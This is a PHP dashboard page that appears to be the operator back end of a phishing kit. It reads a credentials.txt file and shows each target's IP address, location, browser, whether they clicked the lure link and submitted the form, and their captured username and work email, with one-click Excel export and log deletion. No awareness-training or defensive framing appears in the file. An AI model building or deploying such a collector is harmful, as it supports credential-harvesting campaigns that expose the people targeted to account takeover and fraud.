<?php
// dash.php - Clean log processor with reorganized columns
$credFile = __DIR__ . '/credentials.txt';
$message = '';

function getCleanSubmissions($credFile) {
    if (!is_file($credFile)) return [];
    
    $content = file_get_contents($credFile);
    $blocks = explode("--------", $content);
    
    $rows = [];
    
    foreach ($blocks as $block) {
        $block = trim($block);
        if (empty($block)) continue;
        
        $lines = explode("\n", $block);
        $timestamp = '—';
        $username = '—';
        $workemail = '—';
        $link_status = 'Clicked';
        $form_status = 'No';
        $client_ip = '—';
        $location = '—';
        $user_agent = '—';
        
        foreach ($lines as $line) {
            if (strpos($line, 'Received at=') === 0) {
                $timestamp = trim(str_replace('Received at=', '', $line));
            } elseif (strpos($line, 'username=') === 0) {
                $val = trim(str_replace('username=', '', $line));
                if ($val !== '' && strpos($val, '—') === false) {
                    $username = $val;
                }
            } elseif (strpos($line, 'workemail=') === 0) {
                $val = trim(str_replace('workemail=', '', $line));
                if ($val !== '' && $val !== '—') {
                    $workemail = $val;
                }
            } elseif (strpos($line, 'form_submitted=') === 0) {
                $val = trim(str_replace('form_submitted=', '', $line));
                if (strpos($val, 'Submitted') !== false) {
                    $form_status = 'Yes';
                }
            } elseif (strpos($line, 'client_ip=') === 0) {
                $client_ip = trim(str_replace('client_ip=', '', $line));
            } elseif (strpos($line, 'location=') === 0) {
                $location = trim(str_replace('location=', '', $line));
            } elseif (strpos($line, 'user_agent=') === 0) {
                $user_agent = trim(str_replace('user_agent=', '', $line));
            }
        }

        if ($form_status === 'No') {
            $username = '—';
            $workemail = '—';
        }

        if ($form_status === 'Yes' && !empty($rows) && end($rows)['form_status'] === 'No' && end($rows)['username'] === '—') {
            $rows[count($rows) - 1] = [
                'timestamp' => $timestamp,
                'username' => $username,
                'workemail' => $workemail,
                'link_status' => 'Clicked',
                'form_status' => 'Yes',
                'client_ip' => $client_ip,
                'location' => $location,
                'user_agent' => $user_agent
            ];
        } else {
            $rows[] = [
                'timestamp' => $timestamp,
                'username' => $username,
                'workemail' => $workemail,
                'link_status' => 'Clicked',
                'form_status' => $form_status,
                'client_ip' => $client_ip,
                'location' => $location,
                'user_agent' => $user_agent
            ];
        }
    }

    return $rows;
}

// Handle Excel Export (with UTF-8 BOM fix)
if (isset($_GET['export']) && $_GET['export'] === 'excel') {
    $submissions = getCleanSubmissions($credFile);
    if (!empty($submissions)) {
        header('Content-Type: application/vnd.ms-excel; charset=utf-8');
        header('Content-Disposition: attachment; filename=NAVIQ_Activity_Logs_' . date('Y-m-d_H-i-s') . '.xls');
        
        echo "\xEF\xBB\xBF";
        
        echo "<table border='1'>";
        echo "<tr style='background:#35175E;color:#FFFFFF;font-weight:bold;'>
                <th>Timestamp</th>
                <th>IP Address</th>
                <th>Location</th>
                <th>Browser / Device</th>
                <th>Link Clicked</th>
                <th>Form Submitted</th>
                <th>Credentials (Username)</th>
                <th>Credentials (Work Email)</th>
              </tr>";
        
        foreach ($submissions as $s) {
            echo "<tr>";
            echo "<td>" . htmlspecialchars($s['timestamp']) . "</td>";
            echo "<td>" . htmlspecialchars($s['client_ip']) . "</td>";
            echo "<td>" . htmlspecialchars($s['location']) . "</td>";
            echo "<td>" . htmlspecialchars($s['user_agent']) . "</td>";
            echo "<td style='background:#fffaeb;color:#b54708;font-weight:bold;'>" . htmlspecialchars($s['link_status']) . "</td>";
            echo "<td style='" . ($s['form_status'] === 'Yes' ? 'background:#ecfdf3;color:#067647;' : '') . "font-weight:bold;'>" . htmlspecialchars($s['form_status']) . "</td>";
            echo "<td>" . htmlspecialchars($s['username']) . "</td>";
            echo "<td>" . htmlspecialchars($s['workemail']) . "</td>";
            echo "</tr>";
        }
        echo "</table>";
        exit;
    } else {
        $message = 'No data available to export.';
    }
}

// Handle deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'delete_all') {
    if (is_file($credFile)) {
        if (unlink($credFile)) {
            $message = 'All logs and credentials file have been deleted successfully.';
        } else {
            $message = 'Could not delete the file. Check file permissions.';
        }
    } else {
        $message = 'No credential file found to delete.';
    }
}

$submissions = getCleanSubmissions($credFile);
$submissions = array_reverse($submissions);
$total = count($submissions);
$clicks = count(array_filter($submissions, fn($s) => $s['form_status'] === 'No'));
$submittedCount = count(array_filter($submissions, fn($s) => $s['form_status'] === 'Yes'));

function esc($value) { 
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); 
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="15">
<title>Activity & Credentials Dashboard</title>
<style>
:root{color-scheme:light;--ink:#172033;--muted:#667085;--line:#e7eaf0;--bg:#f5f7fb;--card:#fff;--accent:#4f46e5;--danger:#b42318;--success:#067647;--warning:#b54708}
*{box-sizing:border-box}body{margin:0;background:var(--bg);font:14px/1.5 Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;color:var(--ink)}
.wrap{max-width:1500px;margin:0 auto;padding:32px 22px}.top{display:flex;justify-content:space-between;align-items:center;gap:16px;margin-bottom:24px}
.eyebrow{font-size:12px;text-transform:uppercase;letter-spacing:.12em;color:var(--accent);font-weight:800}.title{font-size:28px;letter-spacing:-.03em;margin:4px 0}.sub{color:var(--muted);margin:0}
.actions{display:flex;gap:8px;flex-wrap:wrap}.btn{border:1px solid var(--line);background:#fff;color:var(--ink);padding:10px 14px;border-radius:10px;font-weight:700;text-decoration:none;cursor:pointer;font:inherit}
.btn-success{border-color:#abefc6;background:#ecfdf3;color:var(--success)}
.btn-danger{border-color:#fecdca;background:#fff5f4;color:var(--danger)}
.flash{padding:12px 15px;border-radius:10px;background:#ecfdf3;border:1px solid #abefc6;color:#067647;margin-bottom:16px}
.stats{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px;margin-bottom:20px}
.stat,.panel{background:var(--card);border:1px solid var(--line);border-radius:16px;box-shadow:0 3px 12px #10182808}
.stat{padding:20px}.stat-label{color:var(--muted);font-weight:600}.num{font-size:30px;font-weight:800;letter-spacing:-.04em;margin-top:7px}
.panel{overflow:hidden}.panelhead{padding:19px 20px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;align-items:center;gap:10px}.panelhead h2{font-size:16px;margin:0}.count{color:var(--muted);font-size:12px}
.tablewrap{overflow-x:auto}table{width:100%;border-collapse:collapse;min-width:1050px}th,td{text-align:left;padding:14px 18px;border-bottom:1px solid var(--line);vertical-align:middle}th{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);background:#fafbfc}tbody tr:hover{background:#fafbff}tbody tr:last-child td{border-bottom:0}

.user-agent-cell {
    max-width: 250px;
    font-size: 12px;
    color: var(--muted);
    word-break: break-word;
    white-space: normal;
    line-height: 1.4;
}

.pill{display:inline-block;border-radius:999px;padding:4px 10px;font-size:12px;font-weight:700}
.pill-click{background:#fffaeb;color:var(--warning);border:1px solid #fedf89}
.pill-submit{background:#ecfdf3;color:var(--success);border:1px solid #abefc6}
.empty{text-align:center;color:var(--muted);padding:44px 16px}
.foot{font-size:12px;color:var(--muted);margin-top:14px}
@media(max-width:700px){.wrap{padding:20px 12px}.top{align-items:flex-start;flex-direction:column}.title{font-size:23px}.stats{grid-template-columns:1fr}}
</style>
</head>
<body>
<main class="wrap">
<header class="top">
  <div>
    <div class="eyebrow">Real-time Activity Monitor</div>
    <h1 class="title">Captured Logs Dashboard</h1>
    <p class="sub">Organized by Timestamp, IP, Location, Browser, Link status, Form status, and Credentials</p>
  </div>
  <div class="actions">
    <a class="btn" href="">↻ Refresh</a>
    <a class="btn btn-success" href="?export=excel">📊 Download Excel File</a>
    <form method="post" onsubmit="return confirm('Delete logs and remove credentials file? This cannot be undone.');" style="margin:0">
      <input type="hidden" name="action" value="delete_all">
      <button class="btn btn-danger" type="submit">Delete logs & file</button>
    </form>
  </div>
</header>

<?php if ($message !== ''): ?>
  <div class="flash"><?= esc($message) ?></div>
<?php endif; ?>

<section class="stats">
  <div class="stat">
    <div class="stat-label">Total Records</div>
    <div class="num"><?= $total ?></div>
  </div>
  <div class="stat">
    <div class="stat-label">Pending Clicks</div>
    <div class="num" style="color:var(--warning)"><?= $clicks ?></div>
  </div>
  <div class="stat">
    <div class="stat-label">Form Submissions</div>
    <div class="num" style="color:var(--success)"><?= $submittedCount ?></div>
  </div>
</section>

<section class="panel">
  <div class="panelhead">
    <h2>Activity Log Table</h2>
    <span class="count">Auto-refreshes every 15 seconds</span>
  </div>
  <div class="tablewrap">
    <table>
      <thead>
        <tr>
          <th>Timestamp</th>
          <th>IP Address</th>
          <th>Location</th>
          <th>Browser / Device</th>
          <th>Link Clicked</th>
          <th>Form Submitted</th>
          <th>Username</th>
          <th>Work Email</th>
        </tr>
      </thead>
      <tbody>
        <?php if (empty($submissions)): ?>
          <tr><td colspan="8" class="empty">No activity recorded yet in <code>credentials.txt</code>.</td></tr>
        <?php else: ?>
          <?php foreach ($submissions as $s): ?>
            <tr>
              <td><?= esc($s['timestamp']) ?></td>
              <td><code><?= esc($s['client_ip']) ?></code></td>
              <td>📍 <?= esc($s['location']) ?></td>
              <td class="user-agent-cell"><?= esc($s['user_agent']) ?></td>
              <td>
                <span class="pill pill-click"><?= esc($s['link_status']) ?></span>
              </td>
              <td>
                <?php if ($s['form_status'] === 'Yes'): ?>
                  <span class="pill pill-submit">Yes</span>
                <?php else: ?>
                  <span class="pill" style="background:#f2f4f7;color:#344054;">No</span>
                <?php endif; ?>
              </td>
              <td><strong><?= esc($s['username']) ?></strong></td>
              <td><?= esc($s['workemail']) ?></td>
            </tr>
          <?php endforeach; ?>
        <?php endif; ?>
      </tbody>
    </table>
  </div>
</section>
<p class="foot">Data source: <code>credentials.txt</code></p>
</main>
</body>
</html>